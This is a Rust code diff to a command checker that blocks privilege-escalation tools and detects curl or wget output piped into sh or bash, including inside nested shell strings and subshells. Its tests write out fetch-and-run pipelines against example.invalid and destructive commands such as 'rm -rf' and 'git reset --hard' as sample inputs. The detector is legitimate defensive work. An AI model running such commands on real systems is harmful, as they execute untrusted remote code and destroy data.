@@ -12,25 +12,53 @@ pub enum Escalation {
 
 /// Check simple commands, launchers and nested shell command strings.
 pub fn check_command(cmd: &str) -> Result<(), Escalation> {
+    command_words(cmd).map(|_| ())
+}
+
+/// Simple commands after quote removal, assignments and launcher unwrapping.
+pub(crate) fn command_words(cmd: &str) -> Result<Vec<Vec<String>>, Escalation> {
+    let mut words = Vec::new();
+    parse_into(cmd, &mut words, &mut false)?;
+    Ok(words)
+}
+
+/// A download feeds sh/bash through a pipeline, including nested shell strings.
+pub(crate) fn download_to_shell(cmd: &str) -> bool {
+    let mut download = false;
+    let _ = parse_into(cmd, &mut Vec::new(), &mut download);
+    download
+}
+
+fn parse_into(
+    cmd: &str,
+    commands: &mut Vec<Vec<String>>,
+    download: &mut bool,
+) -> Result<(), Escalation> {
     Parser {
         chars: cmd.chars().peekable(),
+        commands,
+        download,
     }
     .list(None)
 }
 
-struct Parser<'a> {
+struct Parser<'a, 'b> {
     chars: Peekable<Chars<'a>>,
+    commands: &'b mut Vec<Vec<String>>,
+    download: &'b mut bool,
 }
 
-impl Parser<'_> {
+impl Parser<'_, '_> {
     fn list(&mut self, end: Option<char>) -> Result<(), Escalation> {
         let mut words = Vec::new();
         let mut word = String::new();
         let mut started = false;
+        let mut piped_download = false;
+        let mut grouped = false;
         while let Some(c) = self.chars.next() {
             if Some(c) == end {
                 push_word(&mut words, &mut word, &mut started);
-                return check_simple(&words);
+                return self.simple(&words, &mut piped_download, false);
             }
             match c {
                 '\'' | '"' => {
@@ -57,9 +85,10 @@ impl Parser<'_> {
                 }
                 '(' => {
                     push_word(&mut words, &mut word, &mut started);
-                    check_simple(&words)?;
+                    self.simple(&words, &mut piped_download, false)?;
                     words.clear();
-                    self.list(Some(')'))?;
+                    self.group(&mut piped_download)?;
+                    grouped = true;
                 }
                 ')' => return Err(unparseable("parenthesis")),
                 '<' | '>' | '&' if c != '&' || self.chars.peek() == Some(&'>') => {
@@ -72,7 +101,15 @@ impl Parser<'_> {
                 }
                 ';' | '&' | '|' | '\n' => {
                     push_word(&mut words, &mut word, &mut started);
-                    check_simple(&words)?;
+                    let pipe = c == '|' && self.chars.peek() != Some(&'|');
+                    if c == '|' && !pipe {
+                        self.chars.next();
+                    }
+                    self.simple(&words, &mut piped_download, pipe)?;
+                    if words.is_empty() && !pipe && (c != '\n' || grouped) {
+                        piped_download = false;
+                    }
+                    grouped = false;
                     words.clear();
                 }
                 '#' if !started => {
@@ -91,7 +128,53 @@ impl Parser<'_> {
             return Err(unparseable("parenthesis or backtick"));
         }
         push_word(&mut words, &mut word, &mut started);
-        check_simple(&words)
+        self.simple(&words, &mut piped_download, false)
+    }
+
+    fn group(&mut self, piped_download: &mut bool) -> Result<(), Escalation> {
+        let before = self.commands.len();
+        self.list(Some(')'))?;
+        let group = &self.commands[before..];
+        if *piped_download
+            && group.iter().any(|words| {
+                words
+                    .first()
+                    .is_some_and(|word| matches!(basename(word), "sh" | "bash"))
+            })
+        {
+            *self.download = true;
+        }
+        *piped_download |= group.iter().any(|words| {
+            words
+                .first()
+                .is_some_and(|word| matches!(basename(word), "curl" | "wget"))
+        });
+        Ok(())
+    }
+
+    fn simple(
+        &mut self,
+        words: &[String],
+        piped_download: &mut bool,
+        pipe: bool,
+    ) -> Result<(), Escalation> {
+        if words.is_empty() {
+            return Ok(());
+        }
+        let before = self.commands.len();
+        check_simple(words, self.commands, self.download)?;
+        if let Some(command) = self.commands[before..]
+            .last()
+            .and_then(|words| words.first())
+        {
+            let command = basename(command);
+            if *piped_download && matches!(command, "sh" | "bash") {
+                *self.download = true;
+            }
+            *piped_download |= matches!(command, "curl" | "wget");
+        }
+        *piped_download &= pipe;
+        Ok(())
     }
 
     fn redirection(&mut self, first: char) -> String {
@@ -173,7 +256,11 @@ fn basename(word: &str) -> &str {
     word.rsplit('/').next().unwrap_or(word)
 }
 
-fn check_simple(mut words: &[String]) -> Result<(), Escalation> {
+fn check_simple(
+    mut words: &[String],
+    commands: &mut Vec<Vec<String>>,
+    download: &mut bool,
+) -> Result<(), Escalation> {
     loop {
         while let Some(word) = words.first() {
             let count = if assignment(word) {
@@ -214,8 +301,11 @@ fn check_simple(mut words: &[String]) -> Result<(), Escalation> {
         }
         let command = basename(command);
         match command {
-            "eval" => return check_command(&args.join(" ")),
-            "watch" => return check_command(&unwrap_launcher(command, args)?.join(" ")),
+            "eval" => return parse_into(&args.join(" "), commands, download),
+            "watch" => {
+                let args = unwrap_launcher(command, args, commands, download)?;
+                return parse_into(&args.join(" "), commands, download);
+            }
             "sudo" | "doas" | "su" | "pkexec" | "run0" | "login" | "chroot" => {
                 return Err(Escalation::Blocked(command.to_string()));
             }
@@ -232,16 +322,20 @@ fn check_simple(mut words: &[String]) -> Result<(), Escalation> {
                         && !pair[0].starts_with("--")
                         && pair[0].contains('c')
                     {
-                        check_command(&pair[1])?;
+                        parse_into(&pair[1], commands, download)?;
                         break;
                     }
                 }
+                commands.push(words.to_vec());
                 return Ok(());
             }
             "env" | "command" | "exec" | "nohup" | "time" | "nice" | "ionice" | "stdbuf"
             | "timeout" | "xargs" | "setsid" | "caffeinate" | "chronic" | "unbuffer" | "flock"
-            | "script" => words = unwrap_launcher(command, args)?,
-            _ => return Ok(()),
+            | "script" => words = unwrap_launcher(command, args, commands, download)?,
+            _ => {
+                commands.push(words.to_vec());
+                return Ok(());
+            }
         }
     }
 }
@@ -255,7 +349,12 @@ fn redirection_target(word: &str) -> Option<&str> {
     .find_map(|operator| word.strip_prefix(operator))
 }
 
-fn unwrap_launcher<'a>(launcher: &str, mut args: &'a [String]) -> Result<&'a [String], Escalation> {
+fn unwrap_launcher<'a>(
+    launcher: &str,
+    mut args: &'a [String],
+    commands: &mut Vec<Vec<String>>,
+    download: &mut bool,
+) -> Result<&'a [String], Escalation> {
     while let Some(option) = args.first() {
         if launcher == "env" && assignment(option) {
             args = &args[1..];
@@ -270,18 +369,18 @@ fn unwrap_launcher<'a>(launcher: &str, mut args: &'a [String]) -> Result<&'a [St
         }
         if launcher == "env" {
             if let Some(value) = option.strip_prefix("--split-string=") {
-                check_command(value)?;
+                parse_into(value, commands, download)?;
             } else if matches!(option.as_str(), "-S" | "--split-string")
                 && let Some(value) = args.get(1)
             {
-                check_command(value)?;
+                parse_into(value, commands, download)?;
             }
         }
         if matches!(launcher, "flock" | "script")
             && matches!(option.as_str(), "-c" | "--command")
             && let Some(value) = args.get(1)
         {
-            check_command(value)?;
+            parse_into(value, commands, download)?;
         }
         let count = if option_value(launcher, option) { 2 } else { 1 };
         args = &args[count.min(args.len())..];
@@ -295,7 +394,7 @@ fn unwrap_launcher<'a>(launcher: &str, mut args: &'a [String]) -> Result<&'a [St
             .is_some_and(|arg| matches!(arg.as_str(), "-c" | "--command"))
     {
         if let Some(value) = args.get(1) {
-            check_command(value)?;
+            parse_into(value, commands, download)?;
         }
         args = &args[2.min(args.len())..];
     }
@@ -373,6 +472,46 @@ fn option_value(launcher: &str, option: &str) -> bool {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn exposes_unwrapped_command_words_without_treating_arguments_as_commands() {
+        let commands = command_words("FOO=1 env -u BAR timeout 5 /bin/rm '-rf' x; echo 'rm -rf'; bash -c 'git reset --hard'; env -S 'cargo test'").unwrap();
+        assert_eq!(
+            commands,
+            vec![
+                vec!["/bin/rm", "-rf", "x"],
+                vec!["echo", "rm -rf"],
+                vec!["git", "reset", "--hard"],
+                vec!["bash", "-c", "git reset --hard"],
+                vec!["cargo", "test"],
+            ]
+        );
+    }
+
+    #[test]
+    fn download_pipelines_respect_quotes_and_command_separators() {
+        for command in [
+            "curl https://example.invalid | sh",
+            "env wget -qO- https://example.invalid | cat | command bash",
+            "bash -c 'curl https://example.invalid | sh'",
+            "curl https://example.invalid |\n sh",
+            "curl https://example.invalid | (sh)",
+            "(curl https://example.invalid) | bash",
+            "curl https://example.invalid | (cat) | sh",
+        ] {
+            assert!(download_to_shell(command), "{command}");
+        }
+        for command in [
+            "echo 'curl https://example.invalid | sh'",
+            "curl https://example.invalid; echo '|'; sh script",
+            "curl https://example.invalid || sh script",
+            "curl https://example.invalid | cat; sh script",
+            "(curl https://example.invalid); sh script",
+            "curl https://example.invalid | (cat); sh script",
+        ] {
+            assert!(!download_to_shell(command), "{command}");
+        }
+    }
 
     #[test]
     fn blocks_escalation_command_words_and_nested_commands() {
